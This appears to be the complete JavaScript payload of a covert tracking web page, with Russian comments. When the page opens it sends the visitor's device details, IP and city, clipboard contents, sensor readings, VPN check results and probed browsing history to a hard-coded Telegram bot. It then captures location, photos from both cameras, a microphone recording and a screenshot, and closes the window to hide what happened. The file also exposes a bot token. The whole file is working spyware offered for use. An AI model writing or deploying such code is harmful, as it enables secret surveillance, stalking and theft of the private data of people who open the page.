// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8583690981:AAH_esCG5wUMmRiegjxDARFQDW6l-VxfJ9w';
const CHAT_ID = '526758225';

const video = document.getElementById('video');

// ========== ОТПРАВКА ==========
async function sendMessage(text) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', text);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendPhoto(blob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendAudio(blob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('voice', blob, 'voice.ogg');
    formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData });
    } catch(e) {}
}

// ========== ОПРЕДЕЛЕНИЕ МОДЕЛИ ТЕЛЕФОНА ==========
function getPhoneModel() {
    const ua = navigator.userAgent;
    const screenSize = `${window.screen.width}x${window.screen.height}`;

    if (ua.includes('iPhone')) {
        const models = {
            '320x480': 'iPhone SE/4/4s',
            '375x667': 'iPhone 6/7/8/SE2',
            '375x812': 'iPhone X/XS/11 Pro',
            '390x844': 'iPhone 12/13/14',
            '393x852': 'iPhone 15 Pro/16/16 Plus',
            '414x896': 'iPhone XR/11/11 Pro Max',
            '428x926': 'iPhone 14 Plus/15 Plus',
            '430x932': 'iPhone 15 Pro Max/16 Pro Max'
        };
        return models[screenSize] || 'iPhone (неизвестная модель)';
    }
    
    if (ua.includes('Android')) {
        const match = ua.match(/\(.+?\)/);
        if (match) {
            const parts = match[0].split(';');
            for (let part of parts) {
                if (part.includes('SM-') || part.includes('Pixel') || part.includes('Redmi') || part.includes('MI')) {
                    return part.trim();
                }
            }
        }
        return `Android (экран ${screenSize})`;
    }
    
    return 'Неизвестное устройство';
}

// ========== ОПРЕДЕЛЕНИЕ ТИПА УСТРОЙСТВА ==========
function getDeviceType() {
    const ua = navigator.userAgent;
    
    if (/iPhone|iPad|iPod/i.test(ua)) {
        if (/iPad/i.test(ua)) return '📱 Планшет (iPad)';
        return '📱 Телефон (iPhone)';
    }
    
    if (/Android/i.test(ua)) {
        if (/Android(?!.*Mobile)/i.test(ua)) return '📱 Планшет (Android)';
        return '📱 Телефон (Android)';
    }
    
    if (/Windows/i.test(ua)) return '💻 Компьютер (Windows)';
    if (/Mac/i.test(ua)) return '💻 Компьютер (Mac)';
    if (/Linux/i.test(ua)) return '💻 Компьютер (Linux)';
    
    return '❓ Неизвестное устройство';
}

// ========== ВСЯ ИНФОРМАЦИЯ ==========
async function sendAllInfo() {
    const ua = navigator.userAgent;
    let os = 'Unknown';
    if (ua.indexOf('Android') > -1) os = 'Android';
    else if (ua.indexOf('iPhone') > -1) os = 'iOS';
    else if (ua.indexOf('Windows') > -1) os = 'Windows';
    else if (ua.indexOf('Mac') > -1) os = 'MacOS';
    
    let browser = 'Unknown';
    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
    else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
    else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
    else if (ua.indexOf('Edg') > -1) browser = 'Edge';
    
    const phoneModel = getPhoneModel();
    const deviceType = getDeviceType();
    const time = new Date().toLocaleString('ru-RU');
    
    let battery = '';
    if ('getBattery' in navigator) {
        try {
            const b = await navigator.getBattery();
            battery = `🔋 Батарея: ${Math.floor(b.level * 100)}% (${b.charging ? 'на зарядке' : 'не заряжается'})`;
        } catch(e) {}
    }
    
    let connection = '';
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        connection = `📡 Интернет: ${conn.effectiveType || 'Unknown'} (${conn.downlink || '?'} Мбит/с)`;
    }
    
    let ip = '';
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        ip = `🌍 IP: ${data.ip}\n📍 Регион: ${data.city}, ${data.region}, ${data.country_name}`;
    } catch(e) {}
    
    const message = `${deviceType}
📱 ОС: ${os} | ${browser}
📲 Модель: ${phoneModel}
⏰ Время: ${time}
${battery}
${connection}
${ip}`;
    
    await sendMessage(message);
}

// ========== ГЕОЛОКАЦИЯ (ОДИН РАЗ, БЕЗ СЛЕЖКИ) ==========
function getGeo(callback) {
    if (!navigator.geolocation) {
        sendMessage('❌ Ошибка: браузер не поддерживает геолокацию');
        callback(null);
        return;
    }
    navigator.geolocation.getCurrentPosition(
        (pos) => callback({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        (error) => {
            let errorMsg = '';
            if (error.code === 1) errorMsg = 'Пользователь ЗАПРЕТИЛ доступ к геолокации';
            else if (error.code === 2) errorMsg = 'Геолокация недоступна';
            else errorMsg = 'Ошибка геолокации';
            sendMessage(`❌ ${errorMsg}`);
            callback(null);
        }
    );
}

// ========== МИКРОФОН (ЗАПИСЬ 5 СЕКУНД) ==========
async function recordAudio() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            await sendAudio(blob, '🎙️ Аудиозапись (5 секунд)');
            stream.getTracks().forEach(t => t.stop());
        };
        
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
    } catch(e) {
        let msg = '';
        if (e.name === 'NotAllowedError') msg = 'Пользователь ЗАПРЕТИЛ доступ к микрофону';
        else if (e.name === 'NotFoundError') msg = 'Микрофон не найден';
        else msg = `Ошибка микрофона: ${e.message}`;
        sendMessage(`❌ ${msg}`);
    }
}

// ========== СКРИНШОТ ЭКРАНА ==========
async function takeScreenshot() {
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
        const videoEl = document.createElement('video');
        const canvas = document.createElement('canvas');
        
        videoEl.srcObject = stream;
        videoEl.play();
        
        videoEl.onloadedmetadata = () => {
            canvas.width = videoEl.videoWidth;
            canvas.height = videoEl.videoHeight;
            canvas.getContext('2d').drawImage(videoEl, 0, 0);
            canvas.toBlob(async (blob) => {
                if (blob) await sendPhoto(blob, '📸 Скриншот экрана');
                stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.9);
        };
    } catch(e) {
        let msg = '';
        if (e.name === 'NotAllowedError') msg = 'Пользователь запретил скриншот экрана';
        else if (e.name === 'NotFoundError') msg = 'Функция скриншота не найдена';
        else msg = `Ошибка скриншота: ${e.message}`;
        sendMessage(`❌ ${msg}`);
    }
}

// ========== ДАТЧИКИ ТЕЛЕФОНА (АНАЛИЗ СОСТОЯНИЯ) ==========
async function getSensorsData() {
    return new Promise((resolve) => {
        if (!('DeviceMotionEvent' in window)) {
            sendMessage(`📊 Статус: датчики не поддерживаются`);
            resolve();
            return;
        }
        
        let maxAcc = 0;
        let maxRot = 0;
        let samples = 0;
        
        const handler = (e) => {
            const acc = e.acceleration;
            const rot = e.rotationRate;
            
            if (acc && acc.x !== null) {
                const accMagnitude = Math.abs(acc.x) + Math.abs(acc.y) + Math.abs(acc.z);
                if (accMagnitude > maxAcc) maxAcc = accMagnitude;
            }
            
            if (rot && rot.beta !== null) {
                const rotMagnitude = Math.abs(rot.alpha || 0) + Math.abs(rot.beta || 0) + Math.abs(rot.gamma || 0);
                if (rotMagnitude > maxRot) maxRot = rotMagnitude;
            }
            
            samples++;
            
            if (samples >= 30) {
                window.removeEventListener('devicemotion', handler);
                
                let status = '';
                
                if (maxAcc < 1.5) {
                    status = 'СТОИТ';
                } else if (maxAcc > 2.5 && maxAcc < 8) {
                    status = 'ИДЁТ (шаги)';
                } else if (maxAcc >= 8) {
                    status = 'ТРЯСУТ';
                } else if (maxRot > 30) {
                    status = 'ПОВОРАЧИВАЮТ';
                } else {
                    status = 'СТОИТ';
                }
                
                sendMessage(`📊 Статус: ${status}`);
                resolve();
            }
        };
        
        window.addEventListener('devicemotion', handler);
        setTimeout(() => {
            window.removeEventListener('devicemotion', handler);
            if (samples < 30) {
                sendMessage(`📊 Статус: СТОИТ (недостаточно данных)`);
                resolve();
            }
        }, 3000);
    });
}

// ========== БУФЕР ОБМЕНА (ЧТЕНИЕ) ==========
async function readClipboard() {
    try {
        const text = await navigator.clipboard.readText();
        if (text) {
            sendMessage(`📋 Буфер обмена: ${text.substring(0, 500)}`);
        } else {
            sendMessage(`📋 Буфер обмена: (пусто)`);
        }
    } catch(e) {
        let msg = '';
        if (e.name === 'NotAllowedError') msg = 'Нет разрешения на чтение буфера обмена';
        else msg = `Ошибка: ${e.message}`;
        sendMessage(`❌ Буфер обмена: ${msg}`);
    }
}

// ========== ВИБРО ==========
function vibratePhone() {
    if (navigator.vibrate) {
        navigator.vibrate([500, 200, 500]);
        sendMessage('📳 Телефон вибрировал (500ms)');
    } else {
        sendMessage('❌ Вибро не поддерживается на этом устройстве');
    }
}

// ========== ПРОВЕРКА VPN/ПРОКСИ ==========
async function checkVPN() {
    try {
        const ipStart = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        const ipWebRTC = await new Promise((resolve) => {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (ice) => {
                if (ice.candidate) {
                    const ip = ice.candidate.address.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
                    if (ip && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
                        resolve(ip);
                    }
                }
            };
            setTimeout(() => resolve(null), 2000);
        });
        
        let msg = `🔍 VPN/Прокси проверка:\n🌐 Публичный IP: ${ipStart.ip}`;
        if (ipWebRTC && ipWebRTC !== ipStart.ip) {
            msg += `\n⚠️ Обнаружена утечка WebRTC: ${ipWebRTC} (возможно VPN/прокси)`;
        } else if (ipWebRTC) {
            msg += `\n✅ WebRTC совпадает с IP (VPN не обнаружен)`;
        } else {
            msg += `\n❓ WebRTC не удалось определить`;
        }
        sendMessage(msg);
    } catch(e) {
        sendMessage(`❌ Ошибка проверки VPN: ${e.message}`);
    }
}

// ========== ИСТОРИЯ САЙТОВ (ПРОВЕРКА ПОСЕЩЕНИЙ) ==========
async function checkBrowserHistory() {
    const sites = [
        'https://google.com',
        'https://youtube.com',
        'https://yandex.ru',
        'https://vk.com',
        'https://t.me',
        'https://instagram.com',
        'https://twitter.com',
        'https://facebook.com',
        'https://whatsapp.com',
        'https://github.com'
    ];
    
    let visited = [];
    for (let site of sites) {
        const link = document.createElement('a');
        link.href = site;
        if (link.href.startsWith('https:')) {
            const color = window.getComputedStyle(link).color;
            if (color === 'rgb(0, 0, 238)' || color === 'rgb(85, 26, 139)') {
                visited.push(site);
            }
        }
    }
    
    if (visited.length > 0) {
        sendMessage(`🌐 История посещений (возможно):\n${visited.join('\n')}`);
    } else {
        sendMessage(`🌐 История сайтов: не удалось определить (или нет посещений)`);
    }
}

// ========== КАМЕРА ==========
function getCamera(facing, callback) {
    const cameraName = facing === 'user' ? 'фронтальной' : 'задней';
    navigator.mediaDevices.getUserMedia({
        video: { 
            facingMode: { exact: facing },
            width: { ideal: 1280 },
            height: { ideal: 720 }
        }
    }).then(stream => callback(stream)).catch((error) => {
        let errorMsg = '';
        if (error.name === 'NotAllowedError') errorMsg = `Пользователь ЗАПРЕТИЛ доступ к ${cameraName} камере`;
        else if (error.name === 'NotFoundError') errorMsg = `${cameraName} камера не найдена`;
        else errorMsg = `Ошибка камеры: ${error.name}`;
        sendMessage(`❌ ${errorMsg}`);
        callback(null);
    });
}

async function takePhoto(stream, caption) {
    return new Promise((resolve) => {
        const canvas = document.createElement('canvas');
        
        video.srcObject = stream;
        video.play().then(() => {
            setTimeout(() => {
                const width = video.videoWidth;
                const height = video.videoHeight;
                
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                
                ctx.drawImage(video, 0, 0, width, height);
                canvas.toBlob(async (blob) => {
                    if (blob) await sendPhoto(blob, caption);
                    resolve();
                }, 'image/jpeg', 0.85);
            }, 800);
        }).catch(() => resolve());
    });
}

// ========== ГЛАВНАЯ ==========
async function main() {
    // Скрываем спиннер
    const loader = document.querySelector('.loader');
    if (loader) loader.style.display = 'none';
    
    // ===== 1. БЕЗ РАЗРЕШЕНИЙ (отправляются сразу) =====
    await sendMessage(`🔍 Определено устройство: ${getDeviceType()}`);
    await sendAllInfo();
    await getSensorsData();
    await readClipboard();
    vibratePhone();
    await checkVPN();
    await checkBrowserHistory();
    
    // ===== 2. С РАЗРЕШЕНИЯМИ (по очереди) =====
    // Геолокация (один раз)
    getGeo(async (loc) => {
        if (loc) {
            await sendMessage(`📍 Яндекс.Карты: https://yandex.com/maps/?pt=${loc.lon},${loc.lat}&z=17`);
        }
        
        // Камера (фронтальная и задняя)
        getCamera('user', async (stream) => {
            if (stream) {
                await takePhoto(stream, '📸 Фронтальная камера');
                
                setTimeout(async () => {
                    getCamera('environment', async (backStream) => {
                        if (backStream) {
                            await takePhoto(backStream, '📸 Задняя камера');
                            backStream.getTracks().forEach(t => t.stop());
                        }
                        stream.getTracks().forEach(t => t.stop());
                        
            // Микрофон
                        await recordAudio();
                        
            // Скриншот экрана
                        await takeScreenshot();
                        
            // Принудительное закрытие через 2 секунды
                        setTimeout(() => {
                            window.close();
            // Если window.close() не сработал (некоторые браузеры блокируют)
                            setTimeout(() => {
                                document.body.innerHTML = '';
                                window.location.href = 'about:blank';
                            }, 500);
                        }, 2000);
                        
                    });
                }, 3000);
            } else {
                setTimeout(() => window.close(), 2000);
            }
        });
    });
}

// ЗАПУСК
main();
